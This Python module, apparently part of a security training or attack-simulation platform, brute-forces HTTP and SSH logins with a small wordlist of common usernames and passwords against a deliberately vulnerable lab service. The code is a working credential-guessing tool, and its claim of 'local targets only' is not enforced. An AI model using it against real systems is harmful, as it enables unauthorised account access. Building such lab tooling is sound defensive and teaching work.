"""Brute force simulator.

Tries a small credential wordlist against either the vulnerable Node API's HTTP
login (default) or the weak SSH server. Bounded attempts, local targets only.
"""

from __future__ import annotations

import asyncio

import httpx

from .base import AttackModuleBase, Emit, register

DEFAULT_USERS = ["admin", "alice", "root"]
DEFAULT_PASSWORDS = [
    "123456", "password", "admin", "letmein", "admin123",
    "root", "toor", "password123", "qwerty",
]


@register
class BruteForce(AttackModuleBase):
    id = "brute_force"
    name = "Brute Force Simulator"
    description = "Credential guessing against HTTP login or weak SSH (no lockout)."
    default_target = "vuln-node-api"
    mitre = "T1110"
    params_schema = {
        "mode": {"type": "select", "options": ["http", "ssh"], "default": "http"},
        "port": {"type": "int", "default": 3001, "label": "Target port"},
        "usernames": {"type": "list", "default": DEFAULT_USERS},
        "passwords": {"type": "list", "default": DEFAULT_PASSWORDS},
    }

    async def run(self, target: str, params: dict, emit: Emit) -> dict:
        mode = params.get("mode", "http")
        users = params.get("usernames") or DEFAULT_USERS
        passwords = params.get("passwords") or DEFAULT_PASSWORDS
        combos = [(u, p) for u in users for p in passwords]
        found = []

        await emit("info", f"Brute forcing {target} via {mode} ({len(combos)} combos)", 5)

        if mode == "ssh":
            found = await self._ssh(target, int(params.get("port", 22)), combos, emit)
        else:
            found = await self._http(target, int(params.get("port", 3001)), combos, emit)

        success = len(found) > 0
        await emit("success" if success else "warn",
                   f"Brute force complete: {len(found)} valid credential(s).", 100,
                   {"credentials": found})
        return {"success": success, "credentials_found": found, "attempts": len(combos)}

    async def _http(self, target, port, combos, emit) -> list:
        base = f"http://{target}:{port}"
        found = []
        async with httpx.AsyncClient(timeout=10) as client:
            for i, (u, p) in enumerate(combos):
                progress = int(10 + (i / len(combos)) * 85)
                try:
                    r = await client.post(f"{base}/api/login", json={"username": u, "password": p})
                    ok = r.status_code == 200 and r.json().get("success")
                except Exception as exc:
                    await emit("error", f"Request failed for {u}:{p} ({exc})", progress)
                    continue
                if ok:
                    await emit("success", f"VALID: {u}:{p}", progress, {"username": u, "password": p})
                    found.append({"username": u, "password": p})
                else:
                    await emit("info", f"Failed: {u}:{p}", progress)
                await asyncio.sleep(0.15)
        return found

    async def _ssh(self, target, port, combos, emit) -> list:
        import paramiko

        found = []
        for i, (u, p) in enumerate(combos):
            progress = int(10 + (i / len(combos)) * 85)
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                await asyncio.to_thread(
                    client.connect, target, port=port, username=u, password=p,
                    timeout=5, allow_agent=False, look_for_keys=False,
                )
                await emit("success", f"VALID SSH: {u}:{p}", progress,
                           {"username": u, "password": p})
                found.append({"username": u, "password": p})
            except paramiko.AuthenticationException:
                await emit("info", f"Failed SSH: {u}:{p}", progress)
            except Exception as exc:
                await emit("error", f"SSH error for {u}: {exc}", progress)
            finally:
                client.close()
        return found
